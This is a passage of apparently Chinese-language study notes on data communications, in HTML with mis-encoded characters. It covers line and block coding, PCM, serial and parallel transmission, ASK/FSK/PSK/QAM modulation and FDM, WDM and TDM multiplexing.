åŒææ€§æ–¹æ¡ˆæ²¡æœ‰ç›´æµæˆåˆ†ï¼Œæœ‰ç€ <em><code>N/2 Bd</code></em> çš„å¹³å‡ä¿¡å·é€Ÿç‡ï¼Œé€šå¸¸ç”¨äºé•¿è·ç¦»é€šä¿¡ï¼Œä½†<strong>å½“æ•°æ®ä¸­å­˜åœ¨0çš„é•¿åºåˆ—æ—¶å°±ä¼šæœ‰åŒæ­¥é—®é¢˜</strong></p><p>  <img src="https://i.loli.net/2021/10/11/HaMg9Pu4kozdcrI.png" alt="image.png"></p><h5 id="å¤šç”µå¹³æ–¹æ¡ˆï¼ˆmultilevelï¼‰"><a href="#å¤šç”µå¹³æ–¹æ¡ˆï¼ˆmultilevelï¼‰" class="headerlink" title="*å¤šç”µå¹³æ–¹æ¡ˆï¼ˆmultilevelï¼‰"></a>*å¤šç”µå¹³æ–¹æ¡ˆï¼ˆmultilevelï¼‰</h5><p>ç”±å¤šä¸ªç”µå¹³è¡¨ç¤ºå¤šä¸ªæ•°æ®å…ƒç´ -&gt;mBnLï¼šæœ‰Lä¸ªç”µå¹³æ¨¡å¼ï¼Œç”±nä¸ªä¿¡å·è¡¨ç¤ºmï¼ˆé•¿åº¦ï¼‰Bï¼ˆäºŒè¿›åˆ¶æ•°æ®ï¼‰æ•°æ®</p><h5 id="å¤šçº¿è·¯ä¼ è¾“ï¼ˆmultitransitionï¼‰"><a href="#å¤šçº¿è·¯ä¼ è¾“ï¼ˆmultitransitionï¼‰" class="headerlink" title="*å¤šçº¿è·¯ä¼ è¾“ï¼ˆmultitransitionï¼‰"></a>*å¤šçº¿è·¯ä¼ è¾“ï¼ˆmultitransitionï¼‰</h5><p>æ¯”è¾ƒå…¸å‹çš„å°±æ˜¯MLT-3</p><h4 id="å—ç¼–ç ï¼ˆblock-codingï¼‰"><a href="#å—ç¼–ç ï¼ˆblock-codingï¼‰" class="headerlink" title="*å—ç¼–ç ï¼ˆblock codingï¼‰"></a>*å—ç¼–ç ï¼ˆblock codingï¼‰</h4><p>å³å°† <code>m ä½/å—</code> çš„ä¸€ç»„å—é‡æ–°åˆ†ä¸º <code>n ä½/å—</code>çš„ä¸€ç»„å—ï¼Œåˆç§°ä¸º <code>mB/nB</code> ç¼–ç æŠ€æœ¯</p><p><img src="https://i.loli.net/2021/10/11/iJwnmoaXgDVWYGQ.png" alt="image.png"></p><h3 id="4-2-æ¨¡æ‹Ÿåˆ°æ•°å­—è½¬æ¢"><a href="#4-2-æ¨¡æ‹Ÿåˆ°æ•°å­—è½¬æ¢" class="headerlink" title="4.2 æ¨¡æ‹Ÿåˆ°æ•°å­—è½¬æ¢"></a>4.2 æ¨¡æ‹Ÿåˆ°æ•°å­—è½¬æ¢</h3><h4 id="è„‰å†²ç è°ƒåˆ¶ï¼ˆPulse-Code-Modulation-PCMï¼‰"><a href="#è„‰å†²ç è°ƒåˆ¶ï¼ˆPulse-Code-Modulation-PCMï¼‰" class="headerlink" title="è„‰å†²ç è°ƒåˆ¶ï¼ˆPulse Code Modulation, PCMï¼‰"></a>è„‰å†²ç è°ƒåˆ¶ï¼ˆPulse Code Modulation, PCMï¼‰</h4><p>å°†æ¨¡æ‹Ÿä¿¡å·è½¬æ¢ä¸ºæ•°å­—ä¿¡å·çš„æœ€é€šç”¨æŠ€æœ¯ï¼Œæœ‰å¦‚ä¸‹ä¸‰ä¸ªè¿‡ç¨‹ï¼š</p><p><img src="https://i.loli.net/2021/10/11/Ep9zod8LD6hcgQK.png" alt="image.png"></p><h5 id="1-é‡‡æ ·ï¼ˆsamplingï¼‰"><a href="#1-é‡‡æ ·ï¼ˆsamplingï¼‰" class="headerlink" title="1.é‡‡æ ·ï¼ˆsamplingï¼‰"></a>1.é‡‡æ ·ï¼ˆsamplingï¼‰</h5><p>åˆç§°ä¸º<strong>è„‰å†²æŒ¯å¹…è°ƒåˆ¶</strong>ï¼ˆpulse amplitude modulationï¼Œ <strong>PAM</strong>ï¼‰ï¼Œä¸»è¦å…³æ³¨ä¸¤ä¸ªæ–¹é¢ï¼š</p><ul><li><strong>é‡‡æ ·ç‡</strong>ï¼ˆsampling rateï¼‰ï¼šæˆ‘ä»¬æ¯éš” <em><strong>T<sub>s</sub></strong></em> ç§’è¿›è¡Œä¸€æ¬¡é‡‡æ ·ï¼Œé‡‡æ ·ç‡ _<strong>f<sub>sÂ </sub></strong>_ä¾¿æ˜¯<strong>é‡‡æ ·é—´éš”çš„å€’æ•°</strong>ï¼Œåˆç§°ä¸ºé‡‡æ ·é¢‘ç‡ï¼ˆsampling frequencyï¼‰</li><li><strong>å¥ˆå¥æ–¯ç‰¹é‡‡æ ·å®šç†</strong>ï¼šä¸ºäº†å†ç”ŸåŸå§‹æ¨¡æ‹Ÿä¿¡å·ï¼Œ<strong>é‡‡æ ·é€Ÿç‡è‡³å°‘ä¸ºåŸå§‹ä¿¡å·æœ€é«˜é¢‘ç‡çš„ä¸¤å€</strong></li></ul><h5 id="2-é‡åŒ–ï¼ˆquantizingï¼‰"><a href="#2-é‡åŒ–ï¼ˆquantizingï¼‰" class="headerlink" title="2.é‡åŒ–ï¼ˆquantizingï¼‰"></a>2.é‡åŒ–ï¼ˆquantizingï¼‰</h5><p>å³å°†ä¿¡å·çš„è¿ç»­å–å€¼è¿‘ä¼¼ä¸ºæœ‰é™å¤šä¸ªç¦»æ•£å€¼çš„è¿‡ç¨‹ï¼Œå¦‚ä¸‹ï¼š</p><ul><li>å‡å®šåŸå§‹æ¨¡æ‹Ÿä¿¡å·æŒ¯å¹…ä»‹äº <em><strong>V<sub>min</sub></strong></em> å’Œ <em><strong>V<sub>min</sub></strong></em> ä¹‹é—´</li><li>å°†èŒƒå›´åˆ†ä¸º L ä¸ªåŒºé—´ï¼Œæ¯ä¸ªåŒºé—´é«˜åº¦ä¸º Î”</li><li>åˆ†é… 0 åˆ° L-1 çš„é‡åŒ–å€¼ç»™æ¯ä¸ªåŒºé—´çš„ä¸­ç‚¹</li><li>æ ·æœ¬æŒ¯å¹…å€¼è¿‘ä¼¼ä¸ºé‡åŒ–å€¼</li></ul><h6 id="é‡åŒ–è¯¯å·®"><a href="#é‡åŒ–è¯¯å·®" class="headerlink" title="é‡åŒ–è¯¯å·®"></a>é‡åŒ–è¯¯å·®</h6><p>é‡åŒ–æ˜¯ä¸€ä¸ªå°†å®é™…å€¼è½¬ä¸ºè¿‘ä¼¼å€¼çš„è¿‡ç¨‹ï¼Œå› æ­¤ä¼šå­˜åœ¨è¯¯å·®ï¼Œå…¶å¯¹ä¿¡å· SNR<sub>dB</sub> çš„å½±å“å–å†³äºé‡åŒ–çº§åˆ« L æˆ–<strong>æ¯ä¸ªæ ·æœ¬ä½æ•°</strong> n<sub>b</sub></p><h5 id="3-ç¼–ç ï¼ˆencodingï¼‰"><a href="#3-ç¼–ç ï¼ˆencodingï¼‰" class="headerlink" title="3.ç¼–ç ï¼ˆencodingï¼‰"></a>3.ç¼–ç ï¼ˆencodingï¼‰</h5><p>å°†é‡åŒ–åçš„ç¦»æ•£ä¿¡å·è½¬æ¢ä¸ºåŸå§‹ä¿¡å·çš„è¿‡ç¨‹ï¼Œç¼–ç çš„æ¯”ç‰¹ç‡å¯ä»¥ç”±å¦‚ä¸‹å…¬å¼è®¡ç®—ï¼š<br>$$<br>æ¯”ç‰¹ç‡ &#x3D; é‡‡æ ·é€Ÿç‡ Ã— æ¯ä¸ªæ ·æœ¬ä½æ•°<br>$$</p><h3 id="4-3-ä¼ è¾“æ¨¡å¼"><a href="#4-3-ä¼ è¾“æ¨¡å¼" class="headerlink" title="4.3 ä¼ è¾“æ¨¡å¼"></a>4.3 ä¼ è¾“æ¨¡å¼</h3><h4 id="å¹¶è¡Œä¼ è¾“ï¼ˆparallel-transmissionï¼‰"><a href="#å¹¶è¡Œä¼ è¾“ï¼ˆparallel-transmissionï¼‰" class="headerlink" title="å¹¶è¡Œä¼ è¾“ï¼ˆparallel transmissionï¼‰"></a>å¹¶è¡Œä¼ è¾“ï¼ˆparallel transmissionï¼‰</h4><p>ä½¿ç”¨ n æ¡é€šä¿¡çº¿è·¯ï¼Œä»è€Œä¸€æ¬¡å¯ä»¥å‘é€ n ä½æ•°æ®</p><h4 id="ä¸²è¡Œä¼ è¾“ï¼ˆserial-transmissionï¼‰"><a href="#ä¸²è¡Œä¼ è¾“ï¼ˆserial-transmissionï¼‰" class="headerlink" title="ä¸²è¡Œä¼ è¾“ï¼ˆserial transmissionï¼‰"></a>ä¸²è¡Œä¼ è¾“ï¼ˆserial transmissionï¼‰</h4><p>åªéœ€è¦ 1 æ¡é€šä¿¡çº¿è·¯ï¼Œä¸€æ¬¡å‘å‘é€ 1ä½æ•°æ®ï¼Œæœ‰ä¸‰ç§æ¨¡å¼ï¼š</p><ul><li><strong>å¼‚æ­¥ä¼ è¾“</strong>ï¼ˆasynchronous transmissionï¼‰ï¼šå°†ä½æµæŒ‰å­—èŠ‚åˆ†ç»„ï¼Œï¼ˆåœ¨å­—èŠ‚çº§åˆ«ä¸Šï¼‰ä¼ è¾“è¿‡ç¨‹ä¸­ä¸å…³å¿ƒä¿¡å·çš„æ—¶åºï¼ˆæ¯ä¸ª bit ä»è¦åŒæ­¥ï¼‰ï¼Œåœ¨æ¯ä¸ªå­—èŠ‚å¼€å§‹ä¸ç»“å°¾æ·»åŠ èµ·å§‹ä½ä¸åœæ­¢ä½ä»¥æç¤ºæ¥æ”¶æ–¹</li><li><strong>åŒæ­¥ä¼ è¾“</strong>ï¼ˆsynchronous transmissionï¼‰ï¼šå°†ä½æµç»„åˆä¸ºæ›´é•¿çš„â€œå¸§â€ï¼Œä¸€å¸§åŒ…å«æ•°ä¸ªå­—èŠ‚ï¼Œå‘é€æ–¹ä¾æ¬¡å‘é€ä½æµè€Œä¸å«èµ·å§‹ä½ã€åœæ­¢ä½ä¸é—´éš™</li><li><strong>ç­‰æ—¶ä¼ è¾“</strong>ï¼ˆisochronous transmissionï¼‰ï¼šä¿è¯æ•°æ®ä»¥å›ºå®šé€Ÿç‡åˆ°è¾¾</li></ul><h2 id="Chapter-5-æ¨¡æ‹Ÿä¼ è¾“"><a href="#Chapter-5-æ¨¡æ‹Ÿä¼ è¾“" class="headerlink" title="Chapter 5 - æ¨¡æ‹Ÿä¼ è¾“"></a>Chapter 5 - æ¨¡æ‹Ÿä¼ è¾“</h2><p>æ•°å­—ä¼ è¾“éœ€è¦ä½é€šé€šé“ï¼Œè€Œæˆ‘ä»¬é€šå¸¸åªæœ‰å¸¦é€šé€šé“ï¼Œå› æ­¤éœ€è¦å°†æ•°å­—æ•°æ®&#x2F;ä½é€šæ¨¡æ‹Ÿä¿¡å·è½¬æ¢ä¸ºå¸¦é€šæ¨¡æ‹Ÿä¿¡å·</p><h3 id="5-1-æ•°å­—åˆ°æ¨¡æ‹Ÿè½¬æ¢"><a href="#5-1-æ•°å­—åˆ°æ¨¡æ‹Ÿè½¬æ¢" class="headerlink" title="5.1 æ•°å­—åˆ°æ¨¡æ‹Ÿè½¬æ¢"></a>5.1 æ•°å­—åˆ°æ¨¡æ‹Ÿè½¬æ¢</h3><p><img src="https://i.loli.net/2021/10/11/oxNdktvlIfn2iMa.png" alt="image.png"></p><h4 id="æ¯”ç‰¹ç‡å’Œæ³¢ç‰¹ç‡"><a href="#æ¯”ç‰¹ç‡å’Œæ³¢ç‰¹ç‡" class="headerlink" title="æ¯”ç‰¹ç‡å’Œæ³¢ç‰¹ç‡"></a>æ¯”ç‰¹ç‡å’Œæ³¢ç‰¹ç‡</h4><p>ä¸æ•°å­—ä¼ è¾“ç›¸ä¼¼ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥å®šä¹‰æ¯”ç‰¹ç‡ä¸æ³¢ç‰¹ç‡ï¼Œè®¾æ¯”ç‰¹ç‡ä¸º <em>N</em> ï¼Œæ³¢ç‰¹ç‡ä¸º _S_ï¼Œæ¯”ç‡ä¸º _r_ï¼Œå…¶å…³ç³»å¦‚ä¸‹ï¼š<br>$$<br>S &#x3D; N Ã— \frac{1}{r} baud<br>$$<br>åœ¨æ¨¡æ‹Ÿä¼ è¾“ä¸­æœ‰ _<strong>r &#x3D; log<sub>2</sub>L</strong>_ï¼Œå…¶ä¸­ <code>L</code> ä¸ºä¿¡å·å…ƒç´ ç±»å‹ï¼Œè€Œéç”µå¹³æ•°ï¼Œ<strong>æ³¢ç‰¹ç‡å°äºæ¯”ç‰¹ç‡</strong></p><h4 id="å¹…ç§»é”®æ§ï¼ˆamplitude-shift-keyingï¼Œ-ASKï¼‰"><a href="#å¹…ç§»é”®æ§ï¼ˆamplitude-shift-keyingï¼Œ-ASKï¼‰" class="headerlink" title="å¹…ç§»é”®æ§ï¼ˆamplitude-shift keyingï¼Œ ASKï¼‰"></a>å¹…ç§»é”®æ§ï¼ˆamplitude-shift keyingï¼Œ ASKï¼‰</h4><p><img src="https://i.loli.net/2021/10/11/9BigYEr1qPxCHZm.png" alt="image.png"></p><p>ä»¥åŸºå¸¦æ•°å­—ä¿¡å·æ§åˆ¶è½½æ³¢çš„å¹…åº¦å˜åŒ–çš„è°ƒåˆ¶æ–¹å¼ç§°ä¸ºå¹…ç§»é”®æ§(ASK)ï¼Œåˆç§°æ•°å­—è°ƒå¹…</p><p>é€šè¿‡æ”¹å˜è½½æ³¢ä¿¡å·çš„æŒ¯å¹…æ¥ç”Ÿæˆä¿¡å·å…ƒç´ ï¼Œ<strong>åªæœ‰æŒ¯å¹…å˜åŒ–è€Œé¢‘ç‡å’Œç›¸ä½ä¿æŒä¸å˜</strong></p><h5 id="äºŒè¿›åˆ¶-ASKï¼ˆBASKï¼‰"><a href="#äºŒè¿›åˆ¶-ASKï¼ˆBASKï¼‰" class="headerlink" title="äºŒè¿›åˆ¶ ASKï¼ˆBASKï¼‰"></a>äºŒè¿›åˆ¶ ASKï¼ˆBASKï¼‰</h5><p>ä¿¡å·å…ƒç´ åªä½¿ç”¨ä¸¤ä¸ªç”µå¹³ç§°ä¹‹ä¸ºäºŒè¿›åˆ¶å¹…ç§»é”®æ§æˆ–å¼€å…³é”®æ§ï¼ˆOOKï¼‰</p><h5 id="ASK-å¸¦å®½"><a href="#ASK-å¸¦å®½" class="headerlink" title="ASK å¸¦å®½"></a>ASK å¸¦å®½</h5><p>è®¾ä¿¡å·é€Ÿç‡ä¸º _S_ï¼Œå¸¦å®½ä¸º <em>B</em> ï¼Œå–ä¸€ä¸ªå› å­ <em>d</em> ï¼ˆå–å†³äºè°ƒåˆ¶ä¸è¿‡æ»¤å¤„ç†ï¼Œå€¼åœ¨åŒºé—´ <code>[0,1]</code>ï¼‰ï¼Œå¸¦å®½ä¸ä¿¡å·é€Ÿç‡çš„å…³ç³»å¦‚ä¸‹ï¼š<br>$$<br>B &#x3D; (1+d)Ã—S<br>$$<br>è¿™ä¸ªå…¬å¼è¯´æ˜æ‰€éœ€å¸¦å®½æœ€å°ä¸º Sï¼Œæœ€å¤§ä¸º 2Sï¼Œè½½æ³¢é¢‘ç‡ <em><strong>f<sub>c</sub></strong></em> ä½äºå¸¦å®½ä¸­é—´</p><h4 id="é¢‘ç§»é”®æ§ï¼ˆFrequency-shift-keyingï¼ŒFSKï¼‰"><a href="#é¢‘ç§»é”®æ§ï¼ˆFrequency-shift-keyingï¼ŒFSKï¼‰" class="headerlink" title="é¢‘ç§»é”®æ§ï¼ˆFrequency-shift keyingï¼ŒFSKï¼‰"></a>é¢‘ç§»é”®æ§ï¼ˆFrequency-shift keyingï¼ŒFSKï¼‰</h4><p><img src="https://i.loli.net/2021/10/11/kg7T5rdDzsu8lAn.png" alt="image.png"></p><p>ä»¥åŸºå¸¦æ•°å­—ä¿¡å·æ§åˆ¶è½½æ³¢çš„é¢‘ç‡å˜åŒ–çš„è°ƒåˆ¶æ–¹å¼ç§°ä¸ºé¢‘ç§»é”®æ§ï¼Œé€šè¿‡æ”¹å˜è½½æ³¢ä¿¡å·çš„é¢‘ç‡æ¥è¡¨ç¤ºæ•°æ®ï¼Œä¿¡å·å…ƒç´ çš„æŒ¯å¹…å³°å€¼ä¸ç›¸ä½ä¿æŒä¸å˜</p><h5 id="äºŒè¿›åˆ¶-FSKï¼ˆBFSKï¼‰"><a href="#äºŒè¿›åˆ¶-FSKï¼ˆBFSKï¼‰" class="headerlink" title="äºŒè¿›åˆ¶ FSKï¼ˆBFSKï¼‰"></a>äºŒè¿›åˆ¶ FSKï¼ˆBFSKï¼‰</h5><p>å³ä½¿ç”¨ä¸¤ä¸ªè½½æ³¢é¢‘ç‡è¡¨ç¤º 0 ä¸ 1ï¼Œé€šå¸¸è¿™ä¸¤ä¸ªè½½æ³¢é¢‘ç‡å¾ˆé«˜ï¼Œä¹‹é—´çš„å·®å¾ˆå°</p><p>BFSK çš„å®ç°æ–¹å¼æœ‰ï¼š</p><ul><li><strong>ç›¸å¹²</strong>ï¼šä¸¤ä¸ªä¿¡å·å…ƒç´ çš„è¾¹ç•Œå¤„çš„ç›¸ä½æ˜¯è¿ç»­çš„</li><li><strong>éç›¸å¹²</strong>ï¼šä¸¤ä¸ªä¿¡å·å…ƒç´ çš„è¾¹ç•Œå¤„çš„ç›¸ä½æ˜¯éè¿ç»­çš„ï¼Œå¯ä»¥çœ‹ä½œä¸¤ä¸ª ASK</li></ul><h6 id="BFSK-çš„å¸¦å®½"><a href="#BFSK-çš„å¸¦å®½" class="headerlink" title="BFSK çš„å¸¦å®½"></a>BFSK çš„å¸¦å®½</h6><p>æˆ‘ä»¬å¯ä»¥å°† FSK çœ‹åšæœ‰ç€è‡ªå·±è½½æ³¢é¢‘ç‡çš„ä¸¤ä¸ª ASK ä¿¡å·ï¼Œè‹¥ä¸¤é¢‘ç‡å·®å€¼ä¸º <em><strong>2 Î”f</strong></em> ï¼Œåˆ™ BFSK è¦æ±‚çš„å¸¦å®½ä¸ºï¼š<br>$$<br>B &#x3D; (1+d)Ã—S + 2 Î”f<br>$$</p><h4 id="ç›¸ç§»é”®æ§ï¼ˆphase-shift-keyingï¼ŒPSKï¼‰"><a href="#ç›¸ç§»é”®æ§ï¼ˆphase-shift-keyingï¼ŒPSKï¼‰" class="headerlink" title="ç›¸ç§»é”®æ§ï¼ˆphase-shift keyingï¼ŒPSKï¼‰"></a>ç›¸ç§»é”®æ§ï¼ˆphase-shift keyingï¼ŒPSKï¼‰</h4><p>ä»¥åŸºå¸¦æ•°å­—ä¿¡å·æ§åˆ¶è½½æ³¢çš„ç›¸ä½å˜åŒ–çš„è°ƒåˆ¶æ–¹å¼ç§°ä¸ºç›¸ç§»é”®æ§ï¼Œé€šè¿‡æ”¹å˜è½½æ³¢çš„ç›¸ä½æ¥è¡¨ç¤ºä¸¤ä¸ªæˆ–å¤šä¸ªä¿¡å·å…ƒç´ ï¼Œä¿¡å·å…ƒç´ çš„å³°å€¼æŒ¯å¹…ä¸é¢‘ç‡ä¿æŒä¸å˜</p><h5 id="äºŒè¿›åˆ¶-PSKï¼ˆBPSKï¼‰"><a href="#äºŒè¿›åˆ¶-PSKï¼ˆBPSKï¼‰" class="headerlink" title="äºŒè¿›åˆ¶ PSKï¼ˆBPSKï¼‰"></a>äºŒè¿›åˆ¶ PSKï¼ˆBPSKï¼‰</h5><p><img src="https://i.loli.net/2021/10/11/7nhKPUdlq3R5NOc.png" alt="image.png"></p><p>å³åªæœ‰ä¸¤ä¸ªä¿¡å·å…ƒç´ ï¼Œä¸€ä¸ªç›¸ä½ä¸º 0Â° è€Œå¦ä¸€ä¸ªä¸º 180Â°ï¼Œç›¸æ¯”èµ· ASK è€Œè¨€æ›´ä¸æ˜“å—å™ªå£°å½±å“ï¼Œä¹Ÿä¸ä¼¼ FSK ä¸€èˆ¬éœ€è¦ä¸¤ä¸ªè½½æ³¢ä¿¡å·</p><h6 id="BPSK-çš„å¸¦å®½"><a href="#BPSK-çš„å¸¦å®½" class="headerlink" title="BPSK çš„å¸¦å®½"></a>BPSK çš„å¸¦å®½</h6><p>$$<br>B &#x3D; (1+d)Ã—S<br>$$</p><h5 id="æ­£äº¤-PSKï¼ˆQPSKï¼‰"><a href="#æ­£äº¤-PSKï¼ˆQPSKï¼‰" class="headerlink" title="æ­£äº¤ PSKï¼ˆQPSKï¼‰"></a>æ­£äº¤ PSKï¼ˆQPSKï¼‰</h5><p>ä½¿ç”¨ä¸¤ä¸ªç‹¬ç«‹çš„ BPSK è°ƒåˆ¶ï¼šä¸€ä¸ªä¸ºåŒç›¸çš„ï¼Œä¸€ä¸ªä¸ºæ­£äº¤ï¼ˆå¼‚ç›¸ï¼‰çš„</p><h5 id="æ­£äº¤æŒ¯å¹…è°ƒåˆ¶"><a href="#æ­£äº¤æŒ¯å¹…è°ƒåˆ¶" class="headerlink" title="æ­£äº¤æŒ¯å¹…è°ƒåˆ¶"></a>æ­£äº¤æŒ¯å¹…è°ƒåˆ¶</h5><p>ä¸º ASK ä¸ PSK çš„ç»“åˆï¼š<strong>ä½¿ç”¨ä¸¤ä¸ªè½½æ³¢ï¼Œä¸€ä¸ªåŒç›¸è€Œå¦ä¸€ä¸ªæ­£äº¤ï¼Œæ¯ä¸ªè½½æ³¢éƒ½ä½¿ç”¨ä¸åŒçš„æŒ¯å¹…</strong>ï¼Œå¸¦å®½ä¸ ASK å’Œ PSK çš„æœ€å°å¸¦å®½ç›¸åŒ</p><h3 id="5-2-æ¨¡æ‹Ÿä¿¡å·è°ƒåˆ¶"><a href="#5-2-æ¨¡æ‹Ÿä¿¡å·è°ƒåˆ¶" class="headerlink" title="*5.2 æ¨¡æ‹Ÿä¿¡å·è°ƒåˆ¶"></a>*5.2 æ¨¡æ‹Ÿä¿¡å·è°ƒåˆ¶</h3><p>ç”±äºä»‹è´¨çš„é™åˆ¶å› æ­¤æœ‰çš„æ—¶å€™æˆ‘ä»¬è¿˜éœ€è¦å°†æ¨¡æ‹Ÿä¿¡å·è¿›è¡Œè°ƒåˆ¶ï¼Œå³<strong>æ¨¡æ‹Ÿåˆ°æ¨¡æ‹Ÿè½¬æ¢</strong>ï¼ˆanalog-to-analog conversionï¼‰ï¼Œä¸»è¦æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p><ul><li><p>è°ƒå¹…ï¼ˆamplitude modulationï¼ŒAMï¼‰</p></li><li><p>è°ƒé¢‘ï¼ˆfrequency modulationï¼ŒFMï¼‰</p></li><li><p>è°ƒç›¸ï¼ˆphase modulationï¼ŒPMï¼‰</p></li></ul><h2 id="Chapter-6-å¸¦å®½åˆ©ç”¨"><a href="#Chapter-6-å¸¦å®½åˆ©ç”¨" class="headerlink" title="Chapter 6 - å¸¦å®½åˆ©ç”¨"></a>Chapter 6 - å¸¦å®½åˆ©ç”¨</h2><p>ä¸ºè¾¾åˆ°ç›¸åº”çš„ç›®çš„ï¼Œæœ‰æ—¶éœ€è¦å¯¹å¸¦å®½è¿›è¡Œç‰¹æ®Šçš„åˆ©ç”¨ï¼šå¤ç”¨å¸¦å®½ä»¥è·å¾—æ•ˆç‡ã€æ‰©é¢‘ä»¥è¿›è¡Œä¿å¯†ä¸æŠ—å¹²æ‰°</p><h3 id="6-1-å¤ç”¨ï¼ˆmultiplexingï¼‰"><a href="#6-1-å¤ç”¨ï¼ˆmultiplexingï¼‰" class="headerlink" title="6.1 å¤ç”¨ï¼ˆmultiplexingï¼‰"></a>6.1 å¤ç”¨ï¼ˆmultiplexingï¼‰</h3><p>å¤ç”¨å³å…è®¸åŒæ—¶é€šè¿‡ä¸€æ¡æ•°æ®é“¾è·¯ä¼ è¾“å¤šä¸ªä¿¡å·çš„ä¸€ç»„æŠ€æœ¯ï¼šå¤šæ¡çº¿è·¯çš„ä¼ è¾“æµé‡é€åˆ°<strong>å¤ç”¨å™¨</strong>ï¼ˆmultiplexerï¼ŒMUXï¼‰åè¢«ç»„æˆä¸€ä¸ªå•ç‹¬çš„ä¼ è¾“æµï¼Œåœ¨æ¥æ”¶ç«¯è¢«<strong>åˆ†ç¦»å™¨</strong>ï¼ˆdemultiplexerï¼ŒDEMUXï¼‰æ¥æ”¶ï¼Œåˆ†è§£ä¸ºåŸå…ˆçš„ç‹¬ç«‹ä¼ è¾“æµ</p><h4 id="é¢‘åˆ†å¤ç”¨ï¼ˆfrequency-division-multiplexingï¼Œ-FDMï¼‰"><a href="#é¢‘åˆ†å¤ç”¨ï¼ˆfrequency-division-multiplexingï¼Œ-FDMï¼‰" class="headerlink" title="é¢‘åˆ†å¤ç”¨ï¼ˆfrequency-division multiplexingï¼Œ FDMï¼‰"></a>é¢‘åˆ†å¤ç”¨ï¼ˆfrequency-division multiplexingï¼Œ FDMï¼‰</h4><p><img src="https://i.loli.net/2021/10/11/KduOHNaS5oUZwIc.png" alt="image.png"></p><p>åœ¨é“¾è·¯å¸¦å®½å¤§äºå¾…ä¼ è¾“ä¿¡å·å¸¦å®½ä¹‹å’Œæ—¶ä½¿ç”¨ï¼š<strong>å°†ä¸åŒçš„ä¿¡å·è°ƒåˆ¶åˆ°ä¸åŒé¢‘ç‡çš„è½½æ³¢ä¸Šï¼Œå†å°†è°ƒåˆ¶åçš„ä¿¡å·åˆå¹¶ä¸ºä¸€ä¸ªå¤åˆä¿¡å·è¿›è¡Œä¼ è¾“</strong></p><p>ä¸åŒä¿¡å·çš„é€šé“é—´ä¼šæœ‰éƒ¨åˆ†å¸¦å®½æœªè¢«ä½¿ç”¨ï¼Œä½œä¸º<strong>é˜²æŠ¤å¸¦å®½</strong>è¿›è¡Œåˆ†éš”ä»¥é˜²æ­¢ä¿¡å·é‡å </p><h4 id="æ³¢åˆ†å¤ç”¨ï¼ˆwave-division-multiplexingï¼Œ-WDMï¼‰"><a href="#æ³¢åˆ†å¤ç”¨ï¼ˆwave-division-multiplexingï¼Œ-WDMï¼‰" class="headerlink" title="æ³¢åˆ†å¤ç”¨ï¼ˆwave-division multiplexingï¼Œ WDMï¼‰"></a>æ³¢åˆ†å¤ç”¨ï¼ˆwave-division multiplexingï¼Œ WDMï¼‰</h4><p>å°†å¤šä¸ªä¿¡å·è°ƒåˆ¶ä¸ºä¸åŒæ³¢é•¿çš„ä¿¡å·ï¼Œåˆå¹¶ä¸ºå¤åˆä¿¡å·è¿›è¡Œä¼ è¾“ï¼Œç±»ä¼¼äº FDM</p><blockquote><p>ä¸»è¦ç”¨äºå…‰ç¼†</p></blockquote><h4 id="æ—¶åˆ†å¤ç”¨ï¼ˆtime-division-multiplexingï¼ŒTDMï¼‰"><a href="#æ—¶åˆ†å¤ç”¨ï¼ˆtime-division-multiplexingï¼ŒTDMï¼‰" class="headerlink" title="æ—¶åˆ†å¤ç”¨ï¼ˆtime-division multiplexingï¼ŒTDMï¼‰"></a>æ—¶åˆ†å¤ç”¨ï¼ˆtime-division multiplexingï¼ŒTDMï¼‰</h4><p>TDM ä¸ºæ•°å­—åŒ–çš„å…±äº«è¿‡ç¨‹ï¼Œå…±äº«çš„æ˜¯<strong>æ—¶é—´</strong>ï¼š<strong>æ¯ä¸ªè¿æ¥å ç”¨è¯¥æ¡é“¾è·¯çš„ä¸€ä¸ªæ—¶é—´æ®µè¿›è¡Œä¼ è¾“</strong></p><h5 id="åŒæ­¥æ—¶åˆ†å¤ç”¨ï¼ˆsynchronous-TDMï¼‰"><a href="#åŒæ­¥æ—¶åˆ†å¤ç”¨ï¼ˆsynchronous-TDMï¼‰" class="headerlink" title="åŒæ­¥æ—¶åˆ†å¤ç”¨ï¼ˆsynchronous TDMï¼‰"></a>åŒæ­¥æ—¶åˆ†å¤ç”¨ï¼ˆsynchronous TDMï¼‰</h5><p><img src="https://i.loli.net/2021/10/11/Z2PHGCawpDjOM8i.png" alt="image.png"></p><ul><li>æ¯ä¸ªè¾“å…¥è¿æ¥çš„æ•°æ®æµè¢«åˆ’åˆ†æˆ<strong>å¤šä¸ªå•å…ƒ</strong>ï¼ˆä¸€ä½ã€ä¸€å­—èŠ‚ã€ä¸€ä¸ªæ•°æ®å—â€¦ï¼‰ï¼Œæ¯ä¸ªè¾“å…¥å ç”¨ä¸€ä¸ªè¾“å…¥é—´éš™</li><li>æ¯ä¸ªè¾“å…¥å•å…ƒæˆä¸ºä¸€ä¸ªè¾“å‡ºå•å…ƒï¼Œå ç”¨ä¸€ä¸ªè¾“å‡ºé—´éš™</li><li>æ¯ä¸ªè¾“å‡ºå•å…ƒçš„æŒç»­æ—¶é—´æ˜¯è¾“å…¥å•å…ƒæŒç»­æ—¶é—´çš„ <code>1/n</code></li></ul><p>åœ¨åŒæ­¥ TDM ä¸­ï¼Œé“¾è·¯é€Ÿç‡ä¸ºæ•°æ®é€Ÿç‡çš„ n å€ï¼Œæ¯”å•å…ƒæŒç»­æ—¶é—´çŸ­ n å€ï¼ŒTDM é€šè¿‡æ·»åŠ <strong>å¸§æŒ‡ç¤ºä½</strong>è§£å†³å¤ç”¨å™¨ä¸è§£å¤ç”¨å™¨é—´çš„åŒæ­¥é—®é¢˜</p><p>ä¸åŒé“¾è·¯è¾“å…¥æ•°æ®é€Ÿç‡å¯èƒ½å­˜åœ¨å·®å¼‚ï¼Œå½“æŸä¸€è¾“å…¥ç«¯æ²¡æœ‰æ•°æ®å‘é€æ—¶ä¼šå‡ºç°<strong>ç©ºæ—¶éš™</strong>ï¼Œè§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><ul><li><strong>å¤šçº§å¤ç”¨</strong>ï¼šå¤šçº§ TDM</li><li><strong>å¤šæ—¶éš™åˆ†é…</strong>ï¼šä¸ºä¸€æ¡è¾“å…¥çº¿åˆ†é…å¤šä¸ªæ—¶éš™</li><li><strong>è„‰å†²å¡«å……</strong>ï¼šä¸ºé€Ÿç‡è¾ƒä½çš„çº¿è·¯æ·»åŠ 